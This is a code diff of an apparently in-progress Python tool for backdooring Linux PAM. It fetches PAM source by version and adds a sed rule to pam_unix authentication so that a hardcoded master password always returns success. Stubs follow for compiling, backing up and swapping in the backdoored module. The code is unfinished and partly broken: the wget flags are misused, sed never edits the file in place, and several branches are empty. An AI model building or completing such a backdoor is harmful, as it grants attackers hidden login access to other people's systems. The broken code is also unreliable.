@@ -16,6 +16,7 @@ def get_pam_source_code(pam_version):
     
     if '1.1.6' in pam_version:
         os.system('wget https://github.com/linux-pam/linux-pam/archive/refs/tags/v1.1.6.tar.gz -o /tmp/pam_source_116.tar.gz')
+        return '/tmp/pam_source_116.tar.gz'
     elif '1.1.7' in pam_version:
         os.system('wget https://github.com/linux-pam/linux-pam/archive/refs/tags/Linux-PAM-1_1_7.tar.gz -o /tmp/pam_source_117.tar.gz')
     elif '1.1.8' in pam_version:
@@ -34,11 +35,14 @@ def get_pam_source_code(pam_version):
         os.system('wget https://github.com/linux-pam/linux-pam/releases/download/v1.5.0/Linux-PAM-1.5.0.tar.xz -o /tmp/pam_source_150.tar.xz')
     elif '1.5.1' in pam_version:
         os.system('wget https://github.com/linux-pam/linux-pam/releases/download/v1.5.1/Linux-PAM-1.5.1.tar.xz -o /tmp/pam_source_151.tar.xz')
-    elif: #get latest stable
-        pass
+    
+    
 
 def put_backdoor_into_code(password, path_to_source_code):
+    sed_replace_rule = 'retval = _unix.*/if (strcmp(p, \\"' + password + '\\") != 0)\\n\\t{\\n\\t\\t&\\n\\t}\\n\\telse\\n\\t{\\n\\t\\tretval = PAM_SUCCESS;\\n\\t}'
+    os.system("sed 's/" + sed_replace_rule + "/g' " + path_to_source_code) # TEST
     pass
+    
 
 def compile_modified_pam(path_to_source_code):
     pass
@@ -68,5 +72,5 @@ def main(arguments):
     create_backup_of_original_pam()
     copy_backdoored_pam()
 
-
-print(get_pam_version())
+put_backdoor_into_code("TEST_PASS", "/tmp/pam_unix_auth.c")
+#print(get_pam_version())
